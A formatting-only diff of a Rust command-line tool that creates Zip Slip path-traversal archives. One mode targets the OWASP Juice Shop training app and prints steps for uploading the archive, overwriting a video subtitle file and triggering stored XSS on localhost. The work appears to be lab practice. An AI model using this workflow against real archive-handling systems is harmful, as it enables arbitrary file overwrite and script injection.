@@ -44,16 +44,18 @@ fn main() {
     let cli = Cli::parse();
 
     match cli.command {
-        Commands::Create { output, target, content } => {
+        Commands::Create {
+            output,
+            target,
+            content,
+        } => {
             println!("[*] Creating Zip Slip payload...");
             println!("    Output: {}", output);
             println!("    Target: {}", target);
-            
+
             match create_zip_slip(&output, &target, content.as_bytes()) {
                 Ok(_) => {
-                    let size = std::fs::metadata(&output)
-                        .map(|m| m.len())
-                        .unwrap_or(0);
+                    let size = std::fs::metadata(&output).map(|m| m.len()).unwrap_or(0);
                     println!("[+] Created: {} ({} bytes)", output, size);
                 }
                 Err(e) => {
@@ -64,20 +66,20 @@ fn main() {
         }
         Commands::JuiceShop { output } => {
             println!("[*] Creating Juice Shop Video XSS payload...");
-            
+
             let target = juice_shop_vtt_xss();
             println!("    Target: {}", target.path);
-            
+
             match create_zip_slip(&output, &target.path, &target.content) {
                 Ok(_) => {
-                    let size = std::fs::metadata(&output)
-                        .map(|m| m.len())
-                        .unwrap_or(0);
+                    let size = std::fs::metadata(&output).map(|m| m.len()).unwrap_or(0);
                     println!("[+] Created: {} ({} bytes)", output, size);
                     println!();
                     println!("Next steps:");
                     println!("1. Upload to http://localhost:3000/#/complain");
-                    println!("2. Check: curl http://localhost:3000/assets/public/videos/owasp_promo.vtt");
+                    println!(
+                        "2. Check: curl http://localhost:3000/assets/public/videos/owasp_promo.vtt"
+                    );
                     println!("3. Trigger: http://localhost:3000/promotion");
                 }
                 Err(e) => {
@@ -94,7 +96,7 @@ fn main() {
                 println!("  Content: {} bytes", target.content.len());
                 println!();
             }
-            
+
             println!("=== Juice Shop Target ===\n");
             let js = juice_shop_vtt_xss();
             println!("{}", js.name);
